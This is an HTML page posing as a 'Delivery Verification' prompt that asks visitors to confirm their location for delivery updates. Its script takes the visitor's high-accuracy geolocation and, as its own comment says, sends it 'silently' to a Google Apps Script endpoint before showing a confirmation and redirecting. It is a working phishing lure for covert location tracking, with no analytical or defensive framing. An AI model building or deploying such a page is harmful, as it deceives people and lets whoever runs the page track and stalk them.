<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Delivery Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      text-align: center;
      padding: 50px;
    }
    .container {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      max-width: 400px;
      margin: auto;
    }
    button {
      background: #007bff;
      color: #fff;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 15px;
    }
    button:hover {
      background: #0056b3;
    }
    #output { margin-top: 20px; font-size: 15px; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Delivery Verification</h2>
    <p>Please confirm your location for faster delivery updates.</p>
    <button onclick="getLocation()">Confirm Location</button>
    <p id="output"></p>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        document.getElementById("output").innerHTML = "Geolocation not supported.";
      }
    }

    function sendLocation(position) {
      let lat = position.coords.latitude;
      let lon = position.coords.longitude;
      let acc = position.coords.accuracy;

      // Send silently to Google Sheets
      fetch("https://script.google.com/macros/s/AKfycbxEyIKVwgRCupgOvXliaC5UPAi79WSiLhc1nSDlAEwxYTUqCbZ5zw4PGF7eJao21Npv/exec", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc })
      }).then(() => {
        document.getElementById("output").innerHTML = "✅ Location confirmed.";

        // Redirect after confirmation
        setTimeout(() => {
          window.location.href = "https://example.com/thank-you";
        }, 1500); // 1.5s delay for message
      });
    }

    function showError(error) {
      document.getElementById("output").innerHTML = "⚠️ Unable to get location.";
    }
  </script>
</body>
</html>
